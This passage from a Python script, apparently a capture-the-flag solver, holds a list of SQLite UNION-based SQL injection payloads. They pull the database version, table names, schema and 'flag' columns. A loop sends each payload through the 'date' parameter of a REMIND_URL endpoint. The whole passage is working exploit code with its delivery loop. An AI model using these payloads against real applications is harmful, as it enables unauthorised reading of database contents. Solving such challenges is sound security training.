    ("Version - 3 col", "' UNION SELECT sqlite_version(),NULL,NULL--"),
    ("Table names", "' UNION SELECT name FROM sqlite_master WHERE type='table'--"),
    ("Schema", "' UNION SELECT sql FROM sqlite_master--"),
    ("Schema - 2 col", "' UNION SELECT sql,NULL FROM sqlite_master--"),
    ("Flag test", "' UNION SELECT flag FROM users--"),
    ("Flag test 2", "' UNION SELECT flag,NULL FROM flags--"),
    ("Flag test 3", "' UNION SELECT flag,NULL,NULL FROM secrets--"),
]

for desc, payload in extraction_payloads:
    url = f"{REMIND_URL}?date={payload}"
    resp = session.get(url)
    
